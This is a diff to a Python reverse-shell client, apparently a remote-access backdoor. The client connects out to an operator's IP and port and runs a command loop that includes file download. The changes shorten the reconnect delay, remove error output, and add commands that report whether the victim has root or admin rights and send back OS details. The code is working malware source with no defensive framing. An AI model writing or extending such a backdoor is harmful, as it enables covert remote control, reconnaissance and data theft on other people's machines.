@@ -1,22 +1,32 @@
 #!/usr/bin/python3
 
-import socket, sys, argparse, subprocess, json, os, base64, random, string, time
+import socket
+import sys
+import argparse
+import subprocess
+import json
+import os
+import platform
+import base64
+import random
+import string
+import time
 from datetime import datetime
 
 ENCODING = "utf-8"
+SLEEP_TIME = 1
 
 def connection(ip, port):
   global s
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   print("[+] Connecting to %s:%d" % (ip, port))
   while True:
-    time.sleep(10)
+    time.sleep(SLEEP_TIME)
     try:
       s.connect((ip, port))
       shell()
     except Exception as e:
-      print(e)
-      time.sleep(10)
+      time.sleep(SLEEP_TIME)
       connection(ip, port)
 
 def generate_random():
@@ -47,13 +57,37 @@ def reliable_recv():
 def str_to_bytes(string):
   return str(string).encode(ENCODING)
 
+def is_admin():
+  try:
+    os_platform = platform.system()
+    if os_platform == "Windows":
+      try:
+        os.listdir(os.sep.join([os.environ.get("SystemRoot", "c:\windows"), 'temp']))
+      except:
+        return False
+    elif os_platform in ["Linux", "Darwin"]:
+      try:
+        subprocess.check_call("echo hello > /etc/foo", shell=False)
+        os.remove("/etc/foo")
+      except:
+        return False
+    else:
+      return False
+    
+    return True
+  except:
+    return False
+
+def get_os_details():
+  details = "%s %s %s %s %s" % (platform.system(), os.name, platform.release(), list(platform.architecture())[0], platform.version())
+  return details
+
 def shell():
   global s
 
   while True:
     try:
       cmd = reliable_recv().strip()
-
       tmp_cmd = cmd.split(" ")
 
       if cmd == "exit":
@@ -67,6 +101,13 @@ def shell():
           reliable_send(str_to_bytes(""))
         except Exception as e:
           reliable_send(str_to_bytes(e))
+      elif tmp_cmd[0] == "admin":
+        if is_admin():
+          reliable_send(str_to_bytes("ROOT_PRIVILEGES"))
+        else:
+          reliable_send(str_to_bytes("NON_ROOT_PRIVILEGES"))
+      elif tmp_cmd[0] == "os":
+        reliable_send(str_to_bytes(get_os_details()))
       elif tmp_cmd[0] == "download" and tmp_cmd[1] != "":
         try:
           tmp_ext = get_extension(tmp_cmd[1])
